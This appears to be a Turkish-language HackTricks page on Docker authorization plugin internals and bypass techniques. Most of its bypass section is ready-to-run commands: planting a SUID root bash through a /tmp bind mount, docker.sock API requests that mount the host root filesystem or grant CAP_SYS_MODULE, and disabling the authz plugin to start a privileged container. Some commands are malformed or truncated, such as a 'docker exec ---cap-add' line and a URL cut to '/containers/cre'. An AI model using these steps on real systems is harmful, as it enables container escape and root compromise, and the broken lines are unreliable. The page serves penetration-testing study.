<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek paylaşın.

</details>


Docker'ın varsayılan yetkilendirme modeli "hepsi ya da hiçbiri" şeklindedir. Docker daemon'a erişim izni olan herhangi bir kullanıcı, herhangi bir Docker istemci komutunu çalıştırabilir. Aynısı, Docker'ın Engine API'sini kullanarak daemon ile iletişim kuran çağrılar için de geçerlidir. Daha fazla erişim kontrolü gerektiğinde, yetkilendirme eklentileri oluşturabilir ve bunları Docker daemon yapılandırmanıza ekleyebilirsiniz. Bir yetkilendirme eklentisi kullanarak, bir Docker yöneticisi Docker daemon'a erişimi yönetmek için ayrıntılı erişim politikaları yapılandırabilir.

# Temel mimari

Docker Auth eklentileri, Docker Daemon'a yapılan isteklerin kullanıcıya ve istenen eyleme bağlı olarak Docker Daemon tarafından kabul edilip edilmeyeceğini belirleyen harici eklentilerdir.

**[Aşağıdaki bilgiler dokümantasyondan alınmıştır](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

CLI veya Engine API aracılığıyla Docker daemon'a yapılan bir HTTP isteği, kimlik doğrulama alt sistemi tarafından yüklü kimlik doğrulama eklentisine iletilir. İstek, kullanıcı (çağrı yapan) ve komut bağlamını içerir. Eklenti, isteği kabul etmek veya reddetmek için sorumludur.

Aşağıdaki sıra diyagramları, izin verme ve reddetme yetkilendirme akışını göstermektedir:

![Yetkilendirme İzin Verme Akışı](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Yetkilendirme Reddetme Akışı](https://docs.docker.com/engine/extend/images/authz_deny.png)

Eklentiye gönderilen her istek, kimlik doğrulanmış kullanıcıyı, HTTP başlıklarını ve istek/yanıt gövdesini içerir. Sadece kullanıcı adı ve kullanılan kimlik doğrulama yöntemi eklentiye iletilir. En önemlisi, kullanıcı kimlik bilgileri veya belirteçleri iletilmez. Son olarak, tüm istek/yanıt gövdeleri yetkilendirme eklentisine gönderilmez. Yalnızca `Content-Type`'ı `text/*` veya `application/json` olan istek/yanıt gövdeleri gönderilir.

HTTP bağlantısını ele geçirebilecek komutlar (`HTTP Upgrade`) için (örneğin `exec` gibi), yetkilendirme eklentisi yalnızca başlangıç HTTP istekleri için çağrılır. Eklenti komutu onayladığında, yetkilendirme geri kalan akışa uygulanmaz. Özellikle, akış verileri yetkilendirme eklentilerine iletilmez. `logs` ve `events` gibi parçalı HTTP yanıtı döndüren komutlar için, yalnızca HTTP isteği yetkilendirme eklentilerine gönderilir.

İstek/yanıt işleme sırasında, bazı yetkilendirme akışlarının Docker daemon'a ek sorgular yapması gerekebilir. Bu tür akışları tamamlamak için, eklentiler düzenli bir kullanıcı gibi daemon API'sini çağırabilir. Bu ek sorguları etkinleştirmek için, eklenti, bir yöneticinin uygun kimlik doğrulama ve güvenlik politikalarını yapılandırabilmesi için araçlar sağlamalıdır.

## Birden Fazla Eklenti

Eklentinizi Docker daemon başlangıcının bir parçası olarak **kaydetmek** sizin sorumluluğunuzdadır. Birden fazla eklenti kurabilir ve birbirine bağlayabilirsiniz. Bu zincir sıralanabilir. Her istek, zincir üzerinden sırayla geçer. Kaynağa erişim, tüm eklentilerin erişimi onaylaması durumunda sağlanır.

# Eklenti Örnekleri

## Twistlock AuthZ Broker

[**authz**](https://github.com/twistlock/authz) eklentisi, her kullanıcının hangi API uç noktalarına erişebileceğini çok kolay bir şekilde kontrol etmenizi sağlayan bir **JSON** dosyası oluşturmanıza izin verir.

İşte Alice ve Bob'un yeni konteynerler oluşturmasına izin veren bir örnek: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

İstenen URL ile eylem arasındaki ilişkiyi [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) sayfasında bulabilirsiniz. Eylem adı ile eylem arasındaki ilişkiyi [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) sayfasında bulabilirsiniz.

## Basit Eklenti Öğretici

Kurulum ve hata ayıklama hakkında ayrıntılı bilgi içeren **anlaşılması kolay bir eklenti**yi [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot) adresinde bulabilirsiniz.

Nasıl çalıştığını anlamak için `README` ve `plugin.go` kodunu okuyun.

# Docker Auth Eklenti Atlatma

## Erişimi Sırala

Kontrol edilmesi gereken temel şeyler **hangi uç noktaların izin verildiği** ve **Hangi HostConfig değerlerinin izin verildiği**dir.

Bu sıralamayı yapmak için [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler) aracını kullanabilirsiniz.

## Yasaklanan `run --privileged`

### Minimum Yetkiler
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Bir konteyner çalıştırma ve ardından ayrıcalıklı bir oturum elde etme

Bu durumda sistem yöneticisi, kullanıcıların `--privileged` bayrağıyla birlikte hacimleri bağlamasını ve konteynere herhangi bir ek yetenek vermesini **yasakladı**:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Ancak, bir kullanıcı **çalışan konteyner içinde bir kabuk oluşturabilir ve ek ayrıcalıklar verebilir**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Şimdi, kullanıcı önceden tartışılan tekniklerden herhangi birini kullanarak konteynerden kaçabilir ve ana bilgisayarda ayrıcalıkları yükseltebilir.

## Yazılabilir Klasörü Bağlama

Bu durumda sistem yöneticisi, kullanıcıların konteyneri `--privileged` bayrağıyla çalıştırmalarını veya konteynere herhangi bir ek yetenek vermesini engelledi ve yalnızca `/tmp` klasörünü bağlamalarına izin verdi:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Not: Belki `/tmp` klasörünü bağlayamazsınız, ancak **farklı yazılabilir bir klasörü** bağlayabilirsiniz. Yazılabilir dizinleri şu komutla bulabilirsiniz: `find / -writable -type d 2>/dev/null`

**Not: Bir Linux makinesindeki tüm dizinler suid bitini desteklemeyebilir!** Suid bitini destekleyen dizinleri kontrol etmek için `mount | grep -v "nosuid"` komutunu çalıştırın. Örneğin, genellikle `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` ve `/var/lib/lxcfs` suid bitini desteklemez.

Ayrıca, **`/etc`** veya **yapılandırma dosyalarını içeren başka bir klasörü** bağlayabilirseniz, kök olarak docker konteynerinden bu dosyaları kötüye kullanarak ayrıcalıkları yükseltebilirsiniz (belki `/etc/shadow` dosyasını değiştirerek).
{% endhint %}

## Kontrol Edilmeyen API Uç Noktası

Bu eklentiyi yapılandıran sistem yöneticisinin sorumluluğu, her kullanıcının hangi eylemleri ve hangi ayrıcalıklarla gerçekleştirebileceğini kontrol etmektir. Bu nedenle, yönetici uç noktaları ve özniteliklerle **kara liste** yaklaşımı benimserse, bazılarını **unutabilir** ve bu da saldırganın ayrıcalıkları yükseltmesine izin verebilir.

Docker API'sini [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) adresinden kontrol edebilirsiniz.

## Kontrol Edilmeyen JSON Yapısı

### Root'ta Bağlamalar

Sistem yöneticisi docker güvenlik duvarını yapılandırırken [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) gibi önemli bir parametreyi "**Binds**" unutmuş olabilir.\
Aşağıdaki örnekte, bu yapılandırma hatasını kötüye kullanarak ana bilgisayarın root (/) klasörünü bağlayan bir konteyner oluşturup çalıştırmak mümkündür:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Bu örnekte JSON'da **`Binds`** parametresini kök düzey bir anahtar olarak kullanıyoruz, ancak API'de **`HostConfig`** anahtarı altında görünüyor.
{% endhint %}

### HostConfig'da Binds

**Kök düzeydeki Binds** ile aynı talimatları izleyerek Docker API'sine bu **istemi** gerçekleştirin:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Root'ta Mountlar

**Root'ta Bağlantılar** ile aynı talimatları izleyin ve Docker API'sine bu **istemi** gerçekleştirin:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig'da Mountlar

Docker API'ye bu **istemi** gerçekleştirerek **root'ta Bağlantılar** ile aynı talimatları izleyin:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Kontrol Edilmemiş JSON Özniteliği

Sistem yöneticisi docker güvenlik duvarını yapılandırırken, [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) içindeki "**Capabilities**" özelliği gibi bir parametrenin önemli bir özniteliğini **unutmuş olabilir**. Aşağıdaki örnekte, bu yanlış yapılandırmayı istismar ederek **SYS\_MODULE** yeteneğine sahip bir konteyner oluşturup çalıştırmak mümkündür:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`**, genellikle konteynerden kaçmak için ilginç **yetkilere** sahip olan anahtar. Ancak, daha önce tartıştığımız gibi, dışında Binds kullanmanın da çalıştığını ve kısıtlamaları atlamak için izin verebileceğini unutmayın.
{% endhint %}

## Eklentinin Devre Dışı Bırakılması

Eğer **sistem yöneticisi**, **eklentiyi devre dışı bırakma** yeteneğini **yasaklamayı unutmuşsa**, bunu tamamen devre dışı bırakmak için bundan faydalanabilirsiniz!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
**Yükseltme işleminden sonra eklentiyi yeniden etkinleştirmeyi unutmayın**, aksi takdirde docker servisinin yeniden başlatılması çalışmayacaktır!

## Auth Plugin Bypass yazıları

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Referanslar

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
